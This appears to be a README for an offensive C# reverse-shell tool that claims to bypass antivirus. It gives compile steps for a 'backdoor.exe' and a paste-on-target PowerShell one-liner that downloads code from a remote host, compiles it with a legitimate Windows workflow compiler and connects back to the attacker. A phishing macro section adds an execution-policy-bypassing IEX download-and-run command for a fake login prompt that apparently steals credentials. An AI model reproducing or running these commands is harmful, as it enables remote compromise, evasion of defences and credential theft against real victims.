# Reverse shell C# bypassing AV solutions  

## Compile code to .exe (to make a backdoor in an executable file)
To generate the executable file, compile the script "reverse_shell_to_exe.cs" like that :  
sudo apt install mono-complete  
mcs -out:backdoor.exe reverse_shell_to_exec.cs  
mono backdoor.exe  


## Live compiling via Powershell (With physical acces to the target's computer)
To get a reverse shell via a command line (cmd.exe), copy paste the following payload directly on the target's computer   
(it will download the two files from github, compile them with the legit compiler of Windows and launch the connect back to your IP)  
  
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/S-crow/reverseShell/master/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/S-crow/reverseShell/master/reverse_shell.cs', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell


## Full scenario of remote hacking via Macro Word (phishing campaign)


 powershell.exe -ep bypass -c IEX ((New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/S-crow/reverseShell/master/Invoke-LoginPrompt.ps1’)); Invoke-LoginPrompt

